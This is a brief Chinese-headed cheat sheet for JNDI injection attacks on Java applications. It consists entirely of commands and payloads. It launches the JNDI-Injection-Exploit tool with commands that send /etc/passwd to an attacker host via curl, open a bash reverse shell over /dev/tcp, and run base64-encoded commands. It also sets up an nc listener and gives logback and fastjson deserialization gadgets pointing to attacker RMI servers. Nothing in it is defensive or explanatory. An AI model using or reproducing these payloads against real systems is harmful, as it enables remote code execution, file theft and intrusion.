# 服务器
```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl http://IP:PORT -File=@/etc/passwd' -A "IP"

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'bash -i >& /dev/tcp/IP/PORT 0>&1' -A "IP"

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,cmd_base64}|{base64,-d}|{bash,-i}" -A "IP"

nc -lvvp PORT
```

# payload
```json
["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"rmi://IP:1099/6dzonl"}]
```

```json
//fastjson
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
   "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.13.106:9999/rce",
        "autoCommit":true
    }
}
```
